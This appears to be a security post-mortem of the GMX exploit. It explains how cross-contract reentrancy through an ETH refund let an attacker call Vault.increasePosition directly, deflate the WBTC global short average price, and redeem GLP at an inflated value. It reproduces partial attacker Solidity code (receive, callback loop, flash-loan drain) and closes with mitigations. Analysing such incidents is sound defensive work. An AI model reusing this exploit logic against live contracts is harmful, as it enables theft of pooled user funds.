## Step-by-step Overview

The GMX exploit consisted in multiple phases:

1. Setup phase:
    - Attacker deploys a contract with functionality to interact with the GMX protocol and a custom `receive()` function containing the exploit logic.
    - The attacker funds the contract.
    - The attacker creates an order for a long position using the `createIncreaseOrder` function in the `OrderBook` contract.
    - A keeper executes this order.
    - The attacker then creates a decrease order for the long position using the `createDecreaseOrder` function in the `OrderBook` contract.
    - The keeper executes this decrease order, returning eth to the malicious contract and triggering the exploit logic in the `receive()` function.

2. Primary Exploit Phase:
    - The `receive()` function in the malicious contract checks the ratio between `wbtcMaxPrice` and `wbtcGlobalShortAveragePrice`.
    - If the ratio is not greater than 50, calls `increasePosition` directly in the `Vault` contract while leverage is still enabled.
    - This call bypasses the intermediary contracts that would normally update the average short price, creating a state inconsistency.
    - Then, creates a new decrease position using the `createDecreasePosition` function in the `PositionRouter` contract, passing itself as the callback target.
    - The exploit creates a recursive loop where the `UPDATER` periodically executes pending decrease positions, which in turn calls the malicious contract's `gmxPositionCallback` function, creating new decrease orders and perpetuating the cycle.
    - This loop continues until the ratio condition is met, allowing the attacker to execute a final withdrawal of funds from the `Vault`.

3. Final Exploit Phase:
    - When the ratio condition is met, the `receive()` function executes a flash loan from the `Uniswap V3 Pool`.
    - The attacker mints `GLP` at its market price and opens a massive short position
    - Due to the manipulated average short price, the system calculates an inflated "short loss," which artificially inflates the `AUM` for `GLP`.
    - The attacker redeems the minted `GLP` at this inflated price, draining the assets from the pool.

## Detailed Description

### Root Cause

GMX is a decentralized perpetual trading protocol that allows users to trade with leverage while providing liquidity in a multi-token liquidity pool model. The protocol's core components include:

- `GLP` tokens represent shares in a diversified basket of assets.
- Perpetual positions can be opened against this liquidity pool.
- Price oracles provide asset pricing for both trading and liquidity operations.
- Fee collection generates yield for `GLP` holders.

The economic foundation of the protocol relies on accurate `AUM` (Assets Under Management) calculations, which determine `GLP` token redemption values:

```
redeem_amount= ( user_GLP / total_GLP_supply ) × AUM
```

Where `AUM` represents the total value of assets in the `GLP` pool:

```
AUM = sum(token_pool_value) + unrealized_losses_from_shorts 
      - unrealized_profits_from_shorts - reserved_amounts - fees
```

The exploit centered on a cross-contract reentrancy vulnerability that allowed manipulation of the global short position tracking mechanism. The protocol maintains two critical state variables for short positions:

```solidity
mapping(address => uint256) public globalShortSizes;
mapping(address => uint256) public globalShortAveragePrices;
```

These values directly influence `AUM` calculations and, consequently, `GLP` token pricing through unrealized PnL.

Under normal conditions, position increases follow two executions paths trough intermediary contracts that update the state correctly:

- PositionRouter's `increasePosition` function, which calls `updateGlobalShortData` in the `ShortsTracker` contract to update the average short price before the position is updated in the `Vault`:
    ```solidity
    function increasePosition(
        address _vault,
        address _router,
        address _shortsTracker,
        address _account,
        address _collateralToken,
        address _indexToken,
        uint256 _sizeDelta,
        bool _isLong,
        uint256 _price
    ) external {
        //...

        // should be called strictly before position is updated in Vault
        IShortsTracker(_shortsTracker).updateGlobalShortData(_account, _collateralToken, _indexToken, _isLong, _sizeDelta, markPrice, true);

        ITimelock(timelock).enableLeverage(_vault);
        IRouter(_router).pluginIncreasePosition(_account, _collateralToken, _indexToken, _sizeDelta, _isLong);
        ITimelock(timelock).disableLeverage(_vault);
    }
    ```

- PositionManager's `executeIncreaseOrder` function, which also calls `updateGlobalShortData` before updating the position in the `Vault`.
    ```solidity
    function executeIncreaseOrder(address _account, uint256 _orderIndex, address payable _feeReceiver) external onlyOrderKeeper {
        //...

        // should be called strictly before position is updated in Vault
        IShortsTracker(shortsTracker).updateGlobalShortData(_account, collateralToken, indexToken, isLong, sizeDelta, markPrice, true);

        ITimelock(timelock).enableLeverage(_vault);
        IOrderBook(orderBook).executeIncreaseOrder(_account, _orderIndex, _feeReceiver);
        ITimelock(timelock).disableLeverage(_vault);

        _emitIncreasePositionReferral(_account, sizeDelta);
    }
    ```

Both paths ensure that `updateGlobalShortData` is called before the position is updated in the `Vault`.

The attacker exploited a cross-contract reentrancy during the order execution path.

A legitimate order execution through `PositionManager.executeDecreaseOrder` was triggered by the keeper, and when eth is transferred back to the attacker, it invoked the `receive()` function in the attacker's malicious contract. This function contained logic that allowed the attacker to call `increasePosition` directly in the `Vault` contract while leverage was still enabled. This call bypassed the intermediary contracts that would normally update the average short price.

```solidity
function increasePosition(address _account, address _collateralToken, address _indexToken, uint256 _sizeDelta, bool _isLong) external override nonReentrant {
    _validate(isLeverageEnabled, 28);  // ← This check passes during legitimate operations
    
    //...

    if (_isLong) {
            //...
        } else {
            if (globalShortSizes[_indexToken] == 0) {
                globalShortAveragePrices[_indexToken] = price;
            } else {
                globalShortAveragePrices[_indexToken] = getNextGlobalShortAveragePrice(_indexToken, price, _sizeDelta);
            }

            _increaseGlobalShortSize(_indexToken, _sizeDelta);
        }

    //...
}
```

This bypass created a critical state inconsistency in the `ShortsTracker` contract:

- globalShortSizes: Correctly incremented by the direct vault call
- globalShortAveragePrices: Remained stale, not updated to reflect the new position

The protocol's AUM calculation interpreted the increased short size with an outdated average price as an artificial unrealized loss, inflating the calculated value. This manipulation directly increased GLP redemption rates.

### Attack Overview

The exploit was a multi-transaction attack that leveraged a cross-contract reentrancy vulnerability to manipulate the average short price of an asset, ultimately leading to the draining of approximately $42 million USD from the `GLP` vault.

The attacker exploited a reentrancy vulnerability within the `OrderBook.sol` contract, specifically at the `_transferOutETH` function (https://github.com/gmx-io/gmx-contracts/blob/master/contracts/core/OrderBook.sol#L874). While `OrderBook.sol` utilizes a `nonReentrant` modifier, this modifier only prevents reentrancy within the same contract. The attacker exploited this limitation by re-entering the `Vault` contract directly from a malicious contract, bypassing intended access controls and business logic.

Under normal operation, the `increasePosition` function in the `Vault` contract is designed to be called exclusively by the `PositionRouter` and `PositionManager` contracts. These intermediary contracts are crucial for correctly calculating and updating the average short price, which directly influences the price of `GLP` (GMX Liquidity Provider token) by affecting the pending Profit and Loss (PnL) calculation.

The attacker's strategy involved setting up a malicious contract that would be used to interact with the GMX protocol, and had custom logic in the `receive` function to handle incoming Ether and execute the exploit logic.

```solidity
contract ExploitSC {
    function createIncreaseOrder() external payable {
        //...
    }

    function createDecreaseOrder() external payable {
        //...
    }

    receive() external payable {
        //...
    }

    function gmxPositionCallback(bytes32 positionKey, bool isExecuted, bool isIncrease) external{
       //...
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        //...
    }
}
```

Following this, he funded the contract with some `USDC` and used it to initiate an order for a long position by calling `createIncreaseOrder`, which was fulfilled by an off-chain keeper bot in another transaction.

After that, the attacker created a decrease order for the long position, which was also filled by the keeper bot. 

A key element of the exploit was the `executeDecreaseOrder` function of the `PositionManager` contract, which was called by the keeper. Within this function, leverage is explicitly enabled via `ITimelock(timelock).enableLeverage(_vault)` before the call to `IOrderBook(orderBook).executeDecreaseOrder`, and then disabled after it with `ITimelock(timelock).disableLeverage(_vault)`.

```solidity
function executeDecreaseOrder(address _account, uint256 _orderIndex, address payable _feeReceiver) external onlyOrderKeeper {
    //...

    IShortsTracker(shortsTracker).updateGlobalShortData(_account, collateralToken, indexToken, isLong, sizeDelta, markPrice, false);

    ITimelock(timelock).enableLeverage(_vault);
    IOrderBook(orderBook).executeDecreaseOrder(_account, _orderIndex, _feeReceiver);
    ITimelock(timelock).disableLeverage(_vault);

    _emitDecreasePositionReferral(_account, sizeDelta);
}
```

During this transaction, when the ETH refund was triggered in the `OrderBook` contract to the malicious contract, it involved an external arbitrary call that lacked the necessary gas limits or other constraints that would have prevented a re-entrant call. When  the `OrderBook` contract executed the `_transferOutETH` function, it called  `sendValue`, which performed a low-level call to the recipient (the attacker's malicious contract).

```solidity
function _transferOutETH(uint256 _amountOut, address payable _receiver) private {
    IWETH(weth).withdraw(_amountOut);
    _receiver.sendValue(_amountOut);
}

function sendValue(address payable recipient, uint256 amount) internal {
    require(address(this).balance >= amount, "Address: insufficient balance");

    (bool success, ) = recipient.call{ value: amount }("");
    require(success, "Address: unable to send value, recipient may have reverted");
}
```

This `recipient.call{ value: amount }("")` directly invoked the malicious contract's `receive()` function, and because this was called during the execution of `IOrderBook(orderBook).executeDecreaseOrder`, leverage in the `Vault` was still enabled. 

The `receive()` function had conditional logic that depended on the current ratio between `wbtcMaxPrice` and `wbtcGlobalShortAveragePrice`.

```solidity
receive() external payable {
    uint256 wbtcGlobalShortAveragePrice = GLP_MANAGER
        .getGlobalShortAveragePrice(address(WBTC));

    uint256 wbtcMaxPrice = VAULT.getMaxPrice(address(WBTC));

    require(
        wbtcMaxPrice > wbtcGlobalShortAveragePrice,
        "Max price is not greater than global short average price"
    );

    if (wbtcMaxPrice / wbtcGlobalShortAveragePrice > 50) {
        // ...
    } else {
        //...
}
```

When the price ratio condition was not met, the `receive()` function would execute the else branch:

```solidity
if (wbtcMaxPrice / wbtcGlobalShortAveragePrice > 50) {
    //...
} else {
    uint256 usdcBalance = USDC.balanceOf(address(this));
    USDC.transfer(
        address(VAULT),
        usdcBalance
    );
    //...
    VAULT.increasePosition(
        address(this),
        address(USDC),
        address(WBTC),
        sizeDelta,
        false
    );
    //...
    address[] memory path = new address[](1);
    path[0] = address(USDC);

    POSITION_ROUTER.createDecreasePosition{value: 3000000000000000}(
        path,
        address(WBTC),
        0, // collateralDelta
        position.size, // sizeDelta
        false, // isLong
        address(this), // receiver
        120000000000000000000000000000000000, // acceptablePrice
        0, // minOut
        3000000000000000, // executionFee
        false, // withdrawETH
        address(this) // callbackTarget
    );
}
```

Here, it transfers USDC to the `Vault` and invokes `VAULT.increasePosition` while leverage was still enabled. This allowed the attacker to create positions with manipulated leverage, bypassing the `PositionRouter` and `PositionManager` contracts. This direct call was key in manipulating the `wbtcGlobalShortAveragePrice` without undergoing the proper calculation and update mechanisms. After that, the `receive()` function would create a new `decreasePosition` order, setting the callback target back to the malicious contract itself.

The exploit then transitioned into a recursive loop. The `UPDATER` periodically invoked the `setPricesWithBitsAndExecute` function in the `FastPriceFeed` contract, which, as part of its operation, executed pending `decreasePosition` orders, including those newly created by the malicious contract.

```solidity
function setPricesWithBitsAndExecute(
    uint256 _priceBits,
    uint256 _timestamp,
    uint256 _endIndexForIncreasePositions,
    uint256 _endIndexForDecreasePositions,
    uint256 _maxIncreasePositions,
    uint256 _maxDecreasePositions
) external onlyUpdater {
    _setPricesWithBits(_priceBits, _timestamp);

    //...

    _positionRouter.executeIncreasePositions(_endIndexForIncreasePositions, payable(msg.sender));
    _positionRouter.executeDecreasePositions(_endIndexForDecreasePositions, payable(msg.sender));
}
```

Upon the execution of `executeDecreasePosition` in the `PositionRouter` contract by the `UPDATER`, the `_callRequestCallback` function was called and the callback was directed back to the malicious contract:

```solidity
function executeDecreasePosition(bytes32 _key, address payable _executionFeeReceiver) public nonReentrant returns (bool) {
    //...

    _callRequestCallback(request.callbackTarget, _key, true, false);

    return true;
}
```

This callback, in turn, generated yet another `decreaseOrder`, perpetuating a cycle.

```solidity
function gmxPositionCallback(bytes32 positionKey, bool isExecuted, bool isIncrease) external{
    require(msg.sender == address(POSITION_ROUTER), "Unauthorized callback");

    ORDER_BOOK.createDecreaseOrder{value: 3000000000000000}(
        address(WETH),
        53106400000000000000000000000000,
        address(WETH),
        26517133600000000000000000000000,
        true,
        1500000000000000000000000000000000,
        true
    );
}
```

This continuous creation and execution of decreaseOrders between the `UPDATER` and the `KEEPER` combined with the direct calls to `increasePosition` in the `Vault` allowed the attacker to systematically drive down the `wbtcGlobalShortAveragePrice` from its legitimate value of approximately $109,505.77 to $1,913.70. While `globalShortSizes` (the total short position size) was correctly updated by the attacker's actions, the averagePrice within the `getGlobalShortAveragePrice` function, used for `AUM` calculation, remained uncorrected for these "virtual" short positions opened via reentrancy. This created a deceptive impression within the system that existing short positions were opened at a much lower (manipulated) average price, leading to an artificially inflated perceived `AUM` (Assets Under Management) for the `GLP`.

After some iterations of this loop, the ratio between `wbtcMaxPrice` and `wbtcGlobalShortAveragePrice` reached a point where it was greater than 50, triggering the first branch of the `receive()` function. This allowed the attacker to execute a final withdrawal of funds from the `Vault`, draining all the assets. The first step of this final withdrawal involved a flash loan from the `Uniswap V3 Pool`, which was used to get the necessary funds.

```solidity
receive() external payable {
    uint256 wbtcGlobalShortAveragePrice = GLP_MANAGER
        .getGlobalShortAveragePrice(address(WBTC));

    uint256 wbtcMaxPrice = VAULT.getMaxPrice(address(WBTC));

    require(
        wbtcMaxPrice > wbtcGlobalShortAveragePrice,
        "Max price is not greater than global short average price"
    );

    if (wbtcMaxPrice / wbtcGlobalShortAveragePrice > 50) {
        uint256 amount0 = 0;
        uint256 amount1 = 7538567619570;

        bytes
            memory data = hex"0000000000000000000000000000000000000000000000000000016639c6c3f200000000000000000000000000000000000000000000000000000574fbde6000";

        WETH_USDC_POOL.flash(address(this), amount0, amount1, data);
    } else {
        //...
    }
}
```

Within the `uniswapV3FlashCallback` function, the attacker executed the core draining logic. The attacker minted `GLP` at its then-fair market price. Immediately after, a massive short position was opened. Due to the severely manipulated average short price, the system's calculations reported a "short loss" for this newly opened position. This fabricated loss inflated the calculated `AUM` for `GLP`.

This inflated `AUM`, directly influenced by the short losses, caused the `GLP` price to increase. The attacker then proceeded to redeem the previously minted `GLP` at this inflated price. It iterated over multiple tokens held in the vault calculating the available amounts and redeeming `GLP` for each, effectively draining the assets from the pool.


```solidity
function uniswapV3FlashCallback(
    uint256 fee0,
    uint256 fee1,
    bytes calldata data
) external {
    //...
    REWARD_ROUTER_V2.mintAndStakeGlp(address(USDC), value2, 0, 0);
    
    USDC.transfer(address(VAULT), value1);
    //...
    VAULT.increasePosition(
        address(this),
        address(USDC),
        address(WBTC),
        sizeDelta,
        false
    );

    for (uint256 i = 0; i < tokens.length; i++) {
        IERC20 token = IERC20(tokens[i]);
        uint256 tokenDecimal = tokenDecimals[i];
        
        //...

        REWARD_ROUTER_V2.unstakeAndRedeemGlp(
            address(token),
            glpAmountToRedeem,
            0,
            address(this)
        );
    }

    //... Further position manipulation and GLP mint/redeem

    // Repay the flashloan
    USDC.transfer(msg.sender, value1 + value2 + fee1);
}
```

## Possible mitigations

1. Restrict Direct Vault Access:

    Remove the ability to call `increasePosition` directly on the Vault contract. All position operations should be forced through authorized router contracts (`PositionRouter`, `PositionManager`) that properly handle state synchronization.

2. Atomic Global Short Data Updates:

    Calculate and update `globalShortSizes` and `globalShortAveragePrices` together atomically in a single location, rather than having the logic split between different contracts.

3. Gas-Limited ETH Transfers:
    
    Implement gas limits on ETH transfers (e.g., 2300 gas) to prevent recipient contracts from executing arbitrary code during the transfer. This gas limit could be configurable through governance to allow adjustments if needed, but should default to a value that only allows basic receive functions without complex logic.
